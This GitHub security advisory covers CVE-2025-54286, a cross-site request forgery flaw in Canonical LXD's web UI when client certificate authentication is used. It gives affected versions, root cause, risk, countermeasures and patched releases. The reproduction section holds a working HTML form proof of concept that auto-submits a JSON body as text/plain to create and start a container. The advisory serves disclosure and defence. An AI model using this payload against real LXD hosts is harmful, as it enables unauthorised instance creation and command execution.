# [H] Canonical LXD CSRF Vulnerability When Using Client Certificate Authentication with the LXD-UI

## Summary
Severity: High
Advisory: GHSA-p8hw-rfjg-689h
CVE: CVE-2025-54286
CWE: CWE-352
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2025-10-02
Source: https://github.com/advisories/GHSA-p8hw-rfjg-689h
Type: github-advisory

## Affected
- Go: `github.com/canonical/lxd` — affected >=5.0 <5.0.5
- Go: `github.com/canonical/lxd` — affected >=5.1 <5.21.4
- Go: `github.com/canonical/lxd` — affected >=6.0 <6.5
- Go: `github.com/canonical/lxd` — affected >=0.0.0-20220401034332-1e1349e3cbf3 <0.0.0-20250827065555-0494f5d47e41

## Details
### Description
OIDC authentication uses cookies with the SameSite=Strict attribute, preventing cookies from being sent with requests from other sites. Therefore, CSRF does not occur as long as web services in a Same Site relationship (same eTLD+1) with the origin running LXD-UI are trusted.

However, since the SameSite concept does not apply to client certificates, CSRF protection that doesn't rely on the SameSite attribute is necessary.

Note that when using cross-origin fetch API, client certificates are not sent in no-cors mode due to CORS restrictions (according to the WHATWG Fetch specification(https://fetch.spec.whatwg.org/#credentials), client certificates are treated as credentials), making cross-site attacks using fetch API difficult unless CORS settings are vulnerable. However, since LXD's API parses request bodies as JSON even when `Content-Type` is `text/plain` or `application/x-www-form-urlencoded`, CSRF attacks exploiting HTML form submissions are possible.

### Reproduction Steps
1. Prepare a malicious website controlled by the attacker
2. Deploy the following HTML form to implement an attack that automatically creates instances when victims visit:

This exploit code automatically sends a JSON string as text/plain to create an instance when rendered.

Note that for this PoC to work, the specified profile (default) must have a Default instance storage pool configured. 
This is typically set in the default profile of projects created after storage pool creation.

```html
<html>
<body>
<form enctype="text/plain" method="POST" action="https://lxd-host:8443/1.0/instances?project=default&target=" id="form">
<input type="hidden" name='{"' id="input">
<input type="submit">
</form>
<script>
const i = document.getElementById('input');
i.value = `":123,"name":"poc","type":"container","profiles":["default"], "source":{"alias":"24.04","mode":"pull","protocol":"simplestreams","server":"https://cloud-images.ubuntu.com/releases","type":"image"},"devices":{},"config":{},"start":true}`;
document.getElementById('form').submit();
</script>
</body>
</html>
```

3. Log in to LXD-UI with a user having permissions to create instances in the project (default) specified in step 2
4. Access the URL of the HTML file prepared in step 2 and confirm that an instance is created and started

### Risk
The attack conditions require that the victim is already connected to LXD using client certificate authentication and that the attacker can lead the victim to a controlled website.

Possible actions through the attack include, depending on the victim's permissions, creating and starting arbitrary instances, and executing arbitrary commands inside containers using cloud-init.

### Countermeasures
The most effective countermeasure is to strictly enforce `Content-Type` validation at API endpoints. 
Specifically, change the implementation to reject requests when `Content-Type` is not `application/json`. With this countermeasure, attackers cannot send proper JSON requests using Simple Requests (HTML form submissions) and must use fetch API with CORS. However, as long as proper CORS settings are implemented, client certificates are not sent with cross-origin fetch API requests, preventing the attack.

Additionally, implementing CSRF tokens or validating Origin/Referer headers could be considered as countermeasures, but these would create compatibility issues with the LXD command, which is another API client.

### Patches

| LXD Series  | Status |
| ------------- | ------------- |
| 6 | Fixed in LXD 6.5  |
| 5.21 | Fixed in LXD 5.21.4  |
| 5.0 | Fixed in LXD 5.0.5  |
| 4.0  | Ignored - No web UI  |

### References
Reported by GMO Flatt Security Inc.

## References
- https://github.com/canonical/lxd/security/advisories/GHSA-p8hw-rfjg-689h
- https://nvd.nist.gov/vuln/detail/CVE-2025-54286
- https://github.com/canonical/lxd
- https://pkg.go.dev/vuln/GO-2025-4003
